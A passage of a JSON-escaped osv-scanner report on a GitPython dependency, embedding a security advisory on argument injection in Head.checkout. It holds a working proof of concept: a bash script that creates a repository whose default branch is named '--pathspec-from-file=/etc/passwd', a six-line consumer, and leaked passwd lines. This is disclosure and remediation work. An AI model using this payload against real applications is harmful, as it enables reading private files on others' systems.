(`pathspec_from_file=…, pathspec_file_nul=True`), fixed in 3.1.58. That path is closed today; it is\n  the positive control in every batch of this report. The **positional** path is not covered by it.\n\nNeighbours, none overlapping:\n\n- **`GHSA-3wxw-xv34-2frg` / CVE-2026-78679** — the same **class** (positional bypasses a kwargs-only\n  guard) in a different method, `TagReference.create`, fixed in 3.1.59 by `1b0d2d9b`. That is the\n  patch that did not come back to `head.py:286`.\n- **`GHSA-956x-8gvw-wg5v` / CVE-2026-67323** — precedent for \"a value placed before the `--` with no\n  leading-dash check\", in `Repo.iter_commits` / `Repo.blame`. Those sites now pass their positional\n  to the guard; this one does not.\n- **`GHSA-7545-fcxq-7j24` / CVE-2026-44243** — path traversal via ref names in the reference APIs.\n  Different sink (filesystem path construction) and different impact (write and delete), but it\n  establishes that attacker-influenced ref names is a premise this project has already accepted.\n\n### No open fix proposal\n\nSearched across three surfaces, because `gh search issues` excludes pull requests: `gh search prs`,\n`gh search issues` and the raw `search/issues` API. **No open or closed issue or pull request\nproposes passing the positional to the guard in `Head.checkout`.** The three PRs that touch this\nguard (#2204, #2180, #2163) are all merged and none of them does it — #2204 is the PR that\nintroduced *both* call sites in this file, one checking its positional and one not. Full matrix in\n`dup-check.md`.\n\n### The project's own tests carry the same asymmetry\n\n`test/test_refs.py` exercises the guard for both methods, and covers exactly the difference this\nreport is about:\n\n- `HEAD.reset` — the **positional** is tested (lines 304-308).\n- `Head.checkout` — only the **kwargs** path is tested (lines 282-291).\n\nSo the positional variant is a case the suite already knows how to write; it just was not written\nfor `checkout`. The docstring added by #2204 to `Head.checkout` states that `--pathspec-from-file`\nrequires opt-in via `allow_unsafe_options` — which is precisely the guarantee the positional path\ndoes not deliver. Nothing in the project declares the positional acceptable here.\n\n### Why the one-line fix works, which is not obvious\n\n`Reference.__str__` returns `self.name`, not `self.path`. `Reference.name` strips the first two\npath components (`reference.py:122-132`), so a `Head` constructed on\n`refs/heads/--pathspec-from-file=/etc/passwd` passes `check_path` — the *path* does begin with\n`refs/heads/` — while `str()` yields the bare option. Passing `[self]` to `_option_candidates` makes\nthe guard see that same serialised string, which is why the one-line change closes it.\n\n## Evidence\n\n| File | What it establishes |\n|---|---|\n| `poc.sh` | driver — runs all seven scenarios as one unit |\n| `poc.log` | full transcript of the single reference run |\n| `raw/00-versions-and-source.txt` | version under test is the published one; guard and sink present; `def checkout(` appears once, so the sink line is unambiguous |\n| `raw/01-real-argv.txt` | real `git checkout` argv, captured by instrumenting `Git.execute` |\n| `raw/02-refname-accepted-and-cloned.txt` | git accepts the refname; `Repo.clone_from` materialises it unasked |\n| `raw/03-full-file-disclosure.txt` | 34 of 34 lines of `/etc/passwd` recovered |\n| `raw/04-precision-control-reset-vs-checkout.txt` | `HEAD.reset` blocks what `Head.checkout` allows |\n| `raw/05-six-line-consumer.txt` | six-line consumer, verbatim; leaks when the exception is logged and when it is uncaught |\n| `raw/06-push-accepts-refname.txt` | a plain git server accepts the refname over `push` |\n| `raw/07-blob-version-sweep.txt` | affected range by blob hash, tag by tag |\n| `negative-controls.md` | what each control isolates and what would invalidate it |\n| `evidence.sha256` | integrity of every raw file and script |\n\n## Disclosure\n\nReported privately through GitHub private vulnerability reporting. No third-party systems were\ntouched: every repository in this report is a temporary local one, and all transport is `file://`."
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-110859](https://osv.dev/CVE-2026-110859)**.\n\n## [GHSA-23mf-xhv8-69c2](https://osv.dev/GHSA-23mf-xhv8-69c2)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e \u003e **A note on the referenced files.** This report was submitted through GitHub's private\n\u003e \u003e vulnerability reporting API, which carries no attachments. Every transcript this report leans\n\u003e \u003e on is reproduced **inline above**, verbatim. The file names it mentions (`poc.sh`, `poc.log`,\n\u003e \u003e per-case transcripts, `evidence.md`, `negative-controls.md`, blob-sweep tables) are the local\n\u003e \u003e evidence bundle those inline excerpts were extracted from, with a checksum manifest. I am happy\n\u003e \u003e to send the bundle by any channel you prefer, or to open a private fork — just say which. The\n\u003e \u003e PoC scripts are self-contained and reproduce the result from a clean environment.\n\u003e \n\u003e ---\n\u003e \n\u003e **Affected:** `\u003c= 3.1.62` — all published releases; also `main` @ `4905b4af`\n\u003e **Verified at runtime:** GitPython `3.1.62` with git `2.55.0`\n\u003e **Date:** 2026-09-10\n\u003e **Reporter:** MAXI8594\n\u003e \n\u003e ---\n\u003e \n\u003e ## Threat model\n\u003e \n\u003e | | |\n\u003e |---|---|\n\u003e | **Attacker** | anyone who can get the application to clone a URL they control. No account, no credential, no privilege in the consuming application. |\n\u003e | **Pre-need** | a repository they host, with `HEAD` pointing at a branch whose name is the payload. A `git push` to a plain git server is enough — no filesystem access to a server is required (`raw/06`). |\n\u003e | **Gets** | the contents of any file the application's process can read, returned in band through the exception. `/etc/passwd` recovered 34 of 34 lines. |\n\u003e | **Real-world likelihood** | **High.** The vulnerable consumer is six lines of ordinary code with no unusual configuration: `Repo.clone_from(user_url)` then `repo.active_branch.checkout()`. `allow_unsafe_options=False` is the default. Cloning user-supplied URLs is the library's central use case — CI systems, repository importers, scanners and bots. |\n\u003e \n\u003e **On severity relative to the sibling advisories.** GitHub, as CNA, scored the three prior\n\u003e advisories in this class at 6.5 / `PR:L` (CVE-2026-76217, CVE-2026-78678, CVE-2026-78679). This\n\u003e report asks for 7.5 / `PR:N`, and the difference is one measured fact: in those three, the\n\u003e application had to pass an attacker-influenced value into the API. Here it passes nothing — the\n\u003e clone materialises the hostile branch on its own and `repo.active_branch` returns it\n\u003e (`raw/02`). If that reading is not accepted, the `PR:L` path via `Repo.create_head()` is also real\n\u003e and lands at 6.5, matching the siblings.\n\u003e \n\u003e ## Summary\n\u003e \n\u003e `Head.checkout()` guards its `**kwargs` against unsafe Git options but never inspects its own\n\u003e positional argument — the branch name — which reaches the `git checkout` argv with no `--`\n\u003e separator. A repository whose default branch is named `--pathspec-from-file=/etc/passwd` makes a\n\u003e consumer that merely clones it and checks out the default branch return the entire contents of that\n\u003e file to the caller.\n\u003e \n\u003e This is the exact combination of two advisories the project already fixed:\n\u003e \n\u003e - **CVE-2026-76217** (`GHSA-hh9p-6wh2-4mfc`) — *\"Arbitrary file read via `--pathspec-from-file` in\n\u003e   `IndexFile.remove()` **and `Head.checkout()`**\"*. Fixed in 3.1.58 by commit `f2550b65`, which added\n\u003e   the guard to this exact method — but only for `**kwargs`.\n\u003e - **CVE-2026-78679** (`GHSA-3wxw-xv34-2frg`) — *\"`TagReference.create` positional reference\n\u003e   bypasses kwargs-only `--file` guard, enabling arbitrary file read (incomplete fix of 3af0c251)\"*. Fixed in 3.1.59 by commit `1b0d2d9b`, which applied the\n\u003e   positional check to `git/refs/tag.py`, `git/diff.py`, `git/index/base.py` and `git/repo/base.py` —\n\u003e   but not to `git/refs/head.py:286`.\n\u003e \n\u003e `f2550b65` states in its own commit message that the audit found the positional variant and applied\n\u003e it to `HEAD.reset` — 185 lines above `Head.checkout`, in the same file, in the same commit:\n\u003e \n\u003e \u003e \"The audit also found that **reset's positional commit could carry the option before its argument\n\u003e \u003e separator**. […] **Check reset's positional commit as well as keyword options**\"\n\u003e \n\u003e `HEAD.reset` got the fix. `Head.checkout` did not, and `1b0d2d9b` did not come back for it.\n\u003e \n\u003e ## Affected Asset\n\u003e \n\u003e | | |\n\u003e |---|---|\n\u003e | Package | `GitPython` (PyPI) |\n\u003e | Affected versions | **`\u003c= 3.1.62`** — all published releases |\n\u003e | Latest release tested | `3.1.62` |\n\u003e | Also present on | `main` @ `4905b4af` |\n\u003e | Vulnerable file | `git/refs/head.py` |\n\u003e | Guard | line 286 — `Git._option_candidates([], kwargs)` |\n\u003e | Sink | line 293 — `self.repo.git.checkout(self, **kwargs)` |\n\u003e | CWE | CWE-88 (Argument Injection), CWE-73 (External Control of File Name or Path), CWE-200 (Exposure of Sensitive Information) |\n\u003e | CVSS 3.1 | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → **7.5 High** |\n\u003e \n\u003e The version range was established by **blob hash against every tag**, not by dates: the sink line\n\u003e `self.repo.git.checkout(self, **kwargs)` — with no `--` separator — is present in `git/refs/head.py`\n\u003e in every tag from `0.3.1-beta2` through `3.1.62`. The `3.1.62` blob is byte-identical to `main`:\n\u003e `7f563374ef9e018b3d5f95054498e8591e112ce2`. Full sweep in `raw/07-blob-version-sweep.txt`.\n\u003e \n\u003e The kwargs-only guard first appears in **3.1.58**, so `3.1.58`–`3.1.62` is where \"incomplete fix\"\n\u003e applies; earlier releases have the same sink with no guard at all.\n\u003e \n\u003e ## Vulnerability Details\n\u003e \n\u003e ### Root cause\n\u003e \n\u003e `git/cmd.py:1045` — `_option_candidates()` only inspects the positionals it is handed:\n\u003e \n\u003e ```python\n\u003e @classmethod\n\u003e def _option_candidates(cls, args: Sequence[Any] = (), kwargs: Optional[Mapping[str, Any]] = None) -\u003e List[str]:\n\u003e     \"\"\"Collect possible option spellings before command-line transformation.\"\"\"\n\u003e     options = [\n\u003e         option for option in cls._unpack_args([arg for arg in args if arg is not None]) if option.startswith(\"-\")\n\u003e     ]\n\u003e ```\n\u003e \n\u003e So `_option_candidates([], kwargs)` means: *check the keyword arguments, never check the positional\n\u003e arguments this method puts on the command line.* That is fine when the method has no\n\u003e attacker-influenced positional, or when it separates them with `--`.\n\u003e \n\u003e `git/refs/head.py:283-293` — `Head.checkout()` has neither:\n\u003e \n\u003e ```python\n\u003e         if not allow_unsafe_options:\n\u003e             Git.check_unsafe_options(\n\u003e                 options=Git._option_candidates([], kwargs),\n\u003e                 unsafe_options=Git.unsafe_git_pathspec_from_file_options,\n\u003e             )\n\u003e         kwargs[\"f\"] = force\n\u003e         if kwargs[\"f\"] is False:\n\u003e             kwargs.pop(\"f\")\n\u003e \n\u003e         self.repo.git.checkout(self, **kwargs)\n\u003e ```\n\u003e \n\u003e `self` is the only positional. It serialises to the branch name, lands in the `git checkout` argv,\n\u003e and is not in the list the guard inspects. `_call_process` builds `args_list = opt_args + ext_args`,\n\u003e so keyword-derived options precede positionals — which is why the rest of the library puts `\"--\"`\n\u003e first (`Remote.fetch/pull/push`, `Repo._clone`, `Repo.archive`, `IndexFile.remove`, `Commit.count`\n\u003e all do). `Head.checkout` does not.\n\u003e \n\u003e ### Why the branch name is attacker-controlled\n\u003e \n\u003e Git accepts a refname whose branch component begins with `-` and contains `/`\n\u003e (`raw/02-refname-accepted-and-cloned.txt`):\n\u003e \n\u003e ```\n\u003e \u003e\u003e\u003e git check-ref-format 'refs/heads/--pathspec-from-file=/etc/passwd'\n\u003e     exit=0  stderr=''\n\u003e     =\u003e un refname que empieza con '-' y lleva '/' es VALIDO para git\n\u003e \n\u003e \u003e\u003e\u003e git -C \u003cbare\u003e update-ref 'refs/heads/--pathspec-from-file=/etc/passwd' beea87239099\n\u003e     exit=0  stderr=''\n\u003e \u003e\u003e\u003e git -C \u003cbare\u003e symbolic-ref HEAD 'refs/heads/--pathspec-from-file=/etc/passwd'\n\u003e     exit=0\n\u003e     HEAD del bare = refs/heads/--pathspec-from-file=/etc/passwd\n\u003e     ref en disco como arbol jerarquico: True\n\u003e \n\u003e \u003e\u003e\u003e Repo.clone_from('file://\u003cbare\u003e', \u003cvictim\u003e)   # la app solo clona\n\u003e     ramas LOCALES creadas por el clone, sin que nadie las pida:\n\u003e       refs/heads/--pathspec-from-file=/etc/passwd\n\u003e     repo.active_branch.name = '--pathspec-from-file=/etc/passwd'\n\u003e     coincide con el nombre hostil: True\n\u003e ```\n\u003e \n\u003e The transcript above also shows the second half: `git clone` **materialises that branch locally on\n\u003e its own** when the remote `HEAD` points at it — the consuming application never asks for it.\n\u003e \n\u003e A plain git server accepts the refname over `receive-pack`, with no `--force` and no special config\n\u003e (`raw/06-push-accepts-refname.txt`), so the attacker does not need filesystem access to a server —\n\u003e a `git push` is enough. That measurement, and the clone in `raw/02`, both use the `file://`\n\u003e transport, which exercises the same git wire protocol as `https://`; I did not test against a\n\u003e hosted forge, since that would mean writing to a third party.\n\u003e \n\u003e ### Why the leak reaches the caller\n\u003e \n\u003e The file contents are in `CommandError.__str__`, not only in the `.stderr` attribute\n\u003e (`git/exc.py`):\n\u003e \n\u003e ```python\n\u003e         self.stderr = stderr_decode and \"\\n  stderr: '%s'\" % stderr_decode or \"\"\n\u003e \n\u003e     def __str__(self) -\u003e str:\n\u003e         return (self._msg + \"\\n  cmdline: %s%s%s\") % (\n\u003e             self._cmd, self._cause, self._cmdline, self.stdout, self.stderr,\n\u003e         )\n\u003e ```\n\u003e \n\u003e So `logging.exception(...)`, `print(e)`, or simply **not catching** the exception all disclose the\n\u003e file. The developer does not have to know `.stderr` exists.\n\u003e \n\u003e ### Full chain\n\u003e \n\u003e ```\n\u003e Repo.clone_from(\u003cattacker URL\u003e)\n\u003e   ↓  remote HEAD points at refs/heads/--pathspec-from-file=/etc/passwd\n\u003e   ↓  git clone creates that LOCAL branch unasked\n\u003e repo.active_branch                → Head with name = \"--pathspec-from-file=/etc/passwd\"\n\u003e   ↓\n\u003e Head.checkout()                   git/refs/head.py:286 — guard inspects kwargs only\n\u003e   ↓  self.repo.git.checkout(self, **kwargs)   git/refs/head.py:293 — no \"--\"\n\u003e git checkout --pathspec-from-file=/etc/passwd\n\u003e   ↓  git emits one `error:` per unmatched pathspec — one per line of the file\n\u003e GitCommandError → CommandError.__str__ → the consumer\n\u003e ```\n\u003e \n\u003e ## Steps to Reproduce\n\u003e \n\u003e Environment: GitPython 3.1.62, git 2.55.0, Linux x86_64, disposable venv. Everything local —\n\u003e temporary repositories and the `file://` transport. No remote hosts, no third-party repositories.\n\u003e \n\u003e The bundled `poc.sh` runs all seven scenarios as a single unit and writes `poc.log` plus one file per\n\u003e scenario under `raw/`. Minimal manual reproduction:\n\u003e \n\u003e ```bash\n\u003e python3 -m venv /tmp/gp \u0026\u0026 /tmp/gp/bin/python -m pip install gitpython==3.1.62\n\u003e \n\u003e W=$(mktemp -d)\n\u003e git init -q -b main \"$W/a\"; echo x \u003e \"$W/a/f.txt\"\n\u003e git -C \"$W/a\" add f.txt\n\u003e git -C \"$W/a\" -c user.email=a@b -c user.name=a commit -qm c\n\u003e git clone -q --bare \"$W/a\" \"$W/a.git\"\n\u003e SHA=$(git -C \"$W/a.git\" rev-parse HEAD)\n\u003e \n\u003e # the attacker names their default branch after the file they want\n\u003e git -C \"$W/a.git\" update-ref   'refs/heads/--pathspec-from-file=/etc/passwd' \"$SHA\"\n\u003e git -C \"$W/a.git\" symbolic-ref HEAD 'refs/heads/--pathspec-from-file=/etc/passwd'\n\u003e \n\u003e cat \u003e \"$W/consumer.py\" \u003c\u003c'PYEOF'\n\u003e import logging, sys, git\n\u003e logging.basicConfig(level=logging.INFO, format=\"%(message)s\")\n\u003e try:\n\u003e     repo = git.Repo.clone_from(sys.argv[1], sys.argv[2])   # user-supplied URL\n\u003e     repo.active_branch.checkout()                          # ensure a clean working tree\n\u003e except git.exc.GitCommandError:\n\u003e     logging.exception(\"clone failed\")\n\u003e PYEOF\n\u003e \n\u003e /tmp/gp/bin/python \"$W/consumer.py\" \"file://$W/a.git\" \"$W/victim\"\n\u003e ```\n\u003e \n\u003e ### Raw Request\n\u003e \n\u003e The real `git checkout` argv, captured by instrumenting `Git.execute` (`raw/01-real-argv.txt`).\n\u003e This is the command GitPython actually built — the branch name became an option:\n\u003e \n\u003e ```\n\u003e   argv real : ['git', 'checkout', '--pathspec-from-file=/tmp/gpargv-9im8ao2d/SECRET.txt']\n\u003e ```\n\u003e \n\u003e ### Raw Response\n\u003e \n\u003e Observed output (`raw/05-six-line-consumer.txt`, tail) — git emits one `error:` line per unmatched\n\u003e pathspec, which is one per line of the target file:\n\u003e \n\u003e ```\n\u003e error: pathspec 'mysql:x:958:958:MariaDB:/var/lib/mysql:/usr/bin/nologin' did not match any file(s) known to git\n\u003e error: pathspec 'flatpak:x:957:957:Flatpak system helper:/:/usr/bin/nologin' did not match any file(s) known to git\n\u003e error: pathspec 'wazuh:x:956:955:Wazuh Agent:/var/ossec:/usr/sbin/nologin' did not match any file(s) known to git\n\u003e error: pathspec 'jdownloader:x:955:954:jdownloader:/opt/JDownloader/:/bin/false' did not match any file(s) known to git\n\u003e error: pathspec 'cups-browsed:x:953:953:CUPS printer discovery:/:/usr/bin/nologin' did not match any file(s) known to git'\n\u003e ```\n\u003e \n\u003e `raw/03-full-file-disclosure.txt` counts the recovery against the real file:\n\u003e \n\u003e ```\n\u003e Archivo objetivo: /etc/passwd  (34 lineas no vacias)\n\u003e [CASO] repo.active_branch.checkout()  — nadie paso un nombre de rama\n\u003e   repo.active_branch.name = '--pathspec-from-file=/etc/passwd'\n\u003e   -\u003e GitCommandError. Lineas de /etc/passwd recuperadas: 34 de 34\n\u003e ```\n\u003e \n\u003e ## Impact\n\u003e \n\u003e An attacker who can get an application to clone a repository they control reads any file the\n\u003e application's process can read, with the contents returned in band. `/etc/passwd` was recovered in\n\u003e full (34 of 34 lines) in the run recorded in `poc.log`.\n\u003e \n\u003e The attacker needs **no account and no privilege in the consuming application**, and no\n\u003e configuration change anywhere: `allow_unsafe_options=False` is the default, and the vulnerable\n\u003e consumer is six lines of ordinary code. This is the central use case of the library — CI systems,\n\u003e repository importers, scanners and bots that clone user-supplied URLs.\n\u003e \n\u003e ### Impact precondition\n\u003e \n\u003e **Holds if:** the consuming application clones a repository whose default branch name the attacker\n\u003e chose, and then calls `Head.checkout()` on it — most commonly as `repo.active_branch.checkout()`,\n\u003e which needs no branch-name input from the application at all.\n\u003e \n\u003e **Source writer:** the attacker, via the remote repository's `HEAD` and refs. Verified two ways —\n\u003e `git update-ref` + `symbolic-ref` on a bare repository, and `git push` to a plain git server, which\n\u003e `receive-pack` accepts without `--force` or special configuration\n\u003e (`raw/02-refname-accepted-and-cloned.txt`, `raw/06-push-accepts-refname.txt`). The application never\n\u003e writes the branch name; `git clone` materialises it.\n\u003e \n\u003e **Observed in:** `validation/gitpython/head-checkout-positional-pathspec/` — GitPython 3.1.62\n\u003e (latest release) with git 2.55.0, in the single run recorded in `poc.log`\n\u003e (2026-09-10T02:10:23-03:00). File read: `/etc/passwd`, 34 of 34 lines recovered by the caller.\n\u003e \n\u003e \n\u003e ### Limits, stated plainly\n\u003e \n\u003e - Only the full long spelling works, because a refname cannot contain a space and is therefore a\n\u003e   single argv token; `git` rejects the abbreviated forms. This was established while developing the\n\u003e   payload and is **not** part of the attached run — the run exercises the working spelling only.\n\u003e - The attacker must know an absolute path to the target file.\n\u003e - Lines are disclosed only when they do not match a path in the repository. With a one-file hostile\n\u003e   repository none of them do, so the attacker controls this condition too.\n\u003e - The full-file result was measured on **git 2.55.0**, where `git checkout` emits one `error:` per\n\u003e   unmatched pathspec. `GHSA-hh9p-6wh2-4mfc` notes that `--pathspec-from-file` alone quotes only the\n\u003e   first line — that holds for `git rm`, which aborts with `fatal:` on the first. It does not hold for\n\u003e   `git checkout` on 2.55.0.\n\u003e \n\u003e ## Negative control\n\u003e \n\u003e Full statement of what each control isolates and what would invalidate it: `negative-controls.md`.\n\u003e Every batch opens **and closes** with a positive control; if the closing one does not fire, the batch\n\u003e is discarded.\n\u003e \n\u003e **Positive control (opening and closing, 4 batches).** `Head.checkout(pathspec_from_file=\"/etc/passwd\")`\n\u003e — the same payload via kwargs. Fires in every batch:\n\u003e `UnsafeOptionError: --pathspec-from-file is not allowed, use allow_unsafe_options=True to allow it`.\n\u003e This proves the guard exists, is active under the default, and recognises the option — so a null\n\u003e result elsewhere cannot be the instrument failing to reach the code.\n\u003e \n\u003e **Negative control.** The identical call on a branch named `benigna`. One variable changes: the\n\u003e leading `-`. Result: `['git', 'checkout', 'benigna']`, no exception, 0 lines disclosed.\n\u003e \n\u003e **Precision control — the asymmetry inside one file** (`raw/04-precision-control-reset-vs-checkout.txt`).\n\u003e The same payload against the two methods in `git/refs/head.py` that received the guard in the same\n\u003e commit, 185 lines apart:\n\u003e \n\u003e ```\n\u003e [CONTROL DE PRECISION] mismo archivo, mismo commit de fix, dos metodos\n\u003e   HEAD.reset(commit=PAYLOAD)  guard SI mira el posicional BLOQUEADO por el guard (--pathspec-from-file i fuga= 0 lineas  [OK]\n\u003e   Head.checkout()      guard NO mira el posicional     GitCommandError                                fuga=34 lineas  [OK]\n\u003e ```\n\u003e \n\u003e `HEAD.reset` (`head.py:101`, `_option_candidates([commit], kwargs)`) blocks what `Head.checkout`\n\u003e (`head.py:286`, `_option_candidates([], kwargs)`) lets through. This rules out the alternative\n\u003e explanation that any string containing `--pathspec-from-file` reaching git would disclose the file.\n\u003e \n\u003e ## Remediation\n\u003e \n\u003e One line, consistent with what `f2550b65` already did for `HEAD.reset` in this same file:\n\u003e \n\u003e ```python\n\u003e                 options=Git._option_candidates([self], kwargs),\n\u003e ```\n\u003e \n\u003e **The other candidate was evaluated and rejected.** Writing\n\u003e `self.repo.git.checkout(\"--\", self, **kwargs)` would match the `--` pattern used elsewhere in the\n\u003e library and would also cover future `git checkout` options — but it **changes the semantics and\n\u003e breaks the method**: in `git checkout -- \u003carg\u003e`, everything after `--` is a *pathspec*, not a branch.\n\u003e The command would stop switching branches and start restoring files. The `--` pattern works for\n\u003e `fetch`/`pull`/`push`/`clone`/`archive`/`rm` because their positionals genuinely are non-branch\n\u003e operands; it does not transfer here.\n\u003e \n\u003e For defence in depth, `Repo.create_head()` could reject branch names beginning with `-`, which would\n\u003e also close the weaker `PR:L` path. That is a separate, optional change.\n\u003e \n\u003e ## Prior art and de-duplication\n\u003e \n\u003e All GitPython advisories in the GitHub database were reviewed —\n\u003e `gh api advisories -f ecosystem=pip -f affects=GitPython -f per_page=100 --paginate` returns **47**\n\u003e (the same command without `per_page` returns only the first page of 30). `Head.checkout` appears in\n\u003e two rows, one of which (`GHSA-w672-…`) is a withdrawn duplicate, leaving one substantive advisory:\n\u003e \n\u003e - **`GHSA-hh9p-6wh2-4mfc` / CVE-2026-76217** — same method, but the **kwargs** path\n\u003e   (`pathspec_from_file=…, pathspec_file_nul=True`), fixed in 3.1.58. That path is closed today; it is\n\u003e   the positive control in every batch of this report. The **positional** path is not covered by it.\n\u003e \n\u003e Neighbours, none overlapping:\n\u003e \n\u003e - **`GHSA-3wxw-xv34-2frg` / CVE-2026-78679** — the same **class** (positional bypasses a kwargs-only\n\u003e   guard) in a different method, `TagReference.create`, fixed in 3.1.59 by `1b0d2d9b`. That is the\n\u003e   patch that did not come back to `head.py:286`.\n\u003e - **`GHSA-956x-8gvw-wg5v` / CVE-2026-67323** — precedent for \"a value placed before the `--` with no\n\u003e   leading-dash check\", in `Repo.iter_commits` / `Repo.blame`. Those sites now pass their positional\n\u003e   to the guard; this one does not.\n\u003e - **`GHSA-7545-fcxq-7j24` / CVE-2026-44243** — path traversal via ref names in the reference APIs.\n\u003e   Different sink (filesystem path construction) and different impact (write and delete), but it\n\u003e   establishes that attacker-influenced ref names is a premise this project has already accepted.\n\u003e \n\u003e ### No open fix proposal\n\u003e \n\u003e Searched across three surfaces, because `gh search issues` excludes pull requests: `gh search prs`,\n\u003e `gh search issues` and the raw `search/issues` API. **No open or closed issue or pull request\n\u003e proposes passing the positional to the guard in `Head.checkout`.** The three PRs that touch this\n\u003e guard (#2204, #2180, #2163) are all merged and none of them does it — #2204 is the PR that\n\u003e introduced *both* call sites in this file, one checking its positional and one not. Full matrix in\n\u003e `dup-check.md`.\n\u003e \n\u003e ### The project's own tests carry the same asymmetry\n\u003e \n\u003e `test/test_refs.py` exercises the guard for both methods, and covers exactly the difference this\n\u003e report is about:\n\u003e \n\u003e - `HEAD.reset` — the **positional** is tested (lines 304-308).\n\u003e - `Head.checkout` — only the **kwargs** path is tested (lines 282-291).\n\u003e \n\u003e So the positional variant is a case the suite already knows how to write; it just was not written\n\u003e for `checkout`. The docstring added by #2204 to `Head.checkout` states that `--pathspec-from-file`\n\u003e requires opt-in via `allow_unsafe_options` — which is precisely the guarantee the positional path\n\u003e does not deliver. Nothing in the project declares the positional acceptable here.\n\u003e \n\u003e ### Why the one-line fix works, which is not obvious\n\u003e \n\u003e `Reference.__str__` returns `self.name`, not `self.path`. `Reference.name` strips the first two\n\u003e path components (`reference.py:122-132`), so a `Head` constructed on\n\u003e `refs/heads/--pathspec-from-file=/etc/passwd` passes `check_path` — the *path* does begin with\n\u003e `refs/heads/` — while `str()` yields the bare option. Passing `[self]` to `_option_candidates` makes\n\u003e the guard see that same serialised string, which is why the one-line change closes it.\n\u003e \n\u003e ## Evidence\n\u003e \n\u003e | File | What it establishes |\n\u003e |---|---|\n\u003e | `poc.sh` | driver — runs all seven scenarios as one unit |\n\u003e | `poc.log` | full transcript of the single reference run |\n\u003e | `raw/00-versions-and-source.txt` | version under test is the published one; guard and sink present; `def checkout(` appears once, so the sink line is unambiguous |\n\u003e | `raw/01-real-argv.txt` | real `git checkout` argv, captured by instrumenting `Git.execute` |\n\u003e | `raw/02-refname-accepted-and-cloned.txt` | git accepts the refname; `Repo.clone_from` materialises it unasked |\n\u003e | `raw/03-full-file-disclosure.txt` | 34 of 34 lines of `/etc/passwd` recovered |\n\u003e | `raw/04-precision-control-reset-vs-checkout.txt` | `HEAD.reset` blocks what `Head.checkout` allows |\n\u003e | `raw/05-six-line-consumer.txt` | six-line consumer, verbatim; leaks when the exception is logged and when it is uncaught |\n\u003e | `raw/06-push-accepts-refname.txt` | a plain git server accepts the refname over `push` |\n\u003e | `raw/07-blob-version-sweep.txt` | affected range by blob hash, tag by tag |\n\u003e | `negative-controls.md` | what each control isolates and what would invalidate it |\n\u003e | `evidence.sha256` | integrity of every raw file and script |\n\u003e \n\u003e ## Disclosure\n\u003e \n\u003e Reported privately through GitHub private vulnerability reporting. No third-party systems were\n\u003e touched: every repository in this report is a temporary local one, and all transport is `file://`.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | gitpython | 3.1.59 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-23mf-xhv8-69c2 | gitpython | 3.2.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-110859\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-110859](https://osv.dev/CVE-2026-110859)**.\n\n## [GHSA-23mf-xhv8-69c2](https://osv.dev/GHSA-23mf-xhv8-69c2)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e \u003e **A note on the referenced files.** This report was submitted through GitHub's private\n\u003e \u003e vulnerability reporting API, which carries no attachments. Every transcript this report leans\n\u003e \u003e on is reproduced **inline above**, verbatim. The file names it mentions (`poc.sh`, `poc.log`,\n\u003e \u003e per-case transcripts, `evidence.md`, `negative-controls.md`, blob-sweep tables) are the local\n\u003e \u003e evidence bundle those inline excerpts were extracted from, with a checksum manifest. I am happy\n\u003e \u003e to send the bundle by any channel you prefer, or to open a private fork — just say which. The\n\u003e \u003e PoC scripts are self-contained and reproduce the result from a clean environment.\n\u003e \n\u003e ---\n\u003e \n\u003e **Affected:** `\u003c= 3.1.62` — all published releases; also `main` @ `4905b4af`\n\u003e **Verified at runtime:** GitPython `3.1.62` with git `2.55.0`\n\u003e **Date:** 2026-09-10\n\u003e **Reporter:** MAXI8594\n\u003e \n\u003e ---\n\u003e \n\u003e ## Threat model\n\u003e \n\u003e | | |\n\u003e |---|---|\n\u003e | **Attacker** | anyone who can get the application to clone a URL they control. No account, no credential, no privilege in the consuming application. |\n\u003e | **Pre-need** | a repository they host, with `HEAD` pointing at a branch whose name is the payload. A `git push` to a plain git server is enough — no filesystem access to a server is required (`raw/06`). |\n\u003e | **Gets** | the contents of any file the application's process can read, returned in band through the exception. `/etc/passwd` recovered 34 of 34 lines. |\n\u003e | **Real-world likelihood** | **High.** The vulnerable consumer is six lines of ordinary code with no unusual configuration: `Repo.clone_from(user_url)` then `repo.active_branch.checkout()`. `allow_unsafe_options=False` is the default. Cloning user-supplied URLs is the library's central use case — CI systems, repository importers, scanners and bots. |\n\u003e \n\u003e **On severity relative to the sibling advisories.** GitHub, as CNA, scored the three prior\n\u003e advisories in this class at 6.5 / `PR:L` (CVE-2026-76217, CVE-2026-78678, CVE-2026-78679). This\n\u003e report asks for 7.5 / `PR:N`, and the difference is one measured fact: in those three, the\n\u003e application had to pass an attacker-influenced value into the API. Here it passes nothing — the\n\u003e clone materialises the hostile branch on its own and `repo.active_branch` returns it\n\u003e (`raw/02`). If that reading is not accepted, the `PR:L` path via `Repo.create_head()` is also real\n\u003e and lands at 6.5, matching the siblings.\n\u003e \n\u003e ## Summary\n\u003e \n\u003e `Head.checkout()` guards its `**kwargs` against unsafe Git options but never inspects its own\n\u003e positional argument — the branch name — which reaches the `git checkout` argv with no `--`\n\u003e separator. A repository whose default branch is named `--pathspec-from-file=/etc/passwd` makes a\n\u003e consumer that merely clones it and checks out the default branch return the entire contents of that\n\u003e file to the caller.\n\u003e \n\u003e This is the exact combination of two advisories the project already fixed:\n\u003e \n\u003e - **CVE-2026-76217** (`GHSA-hh9p-6wh2-4mfc`) — 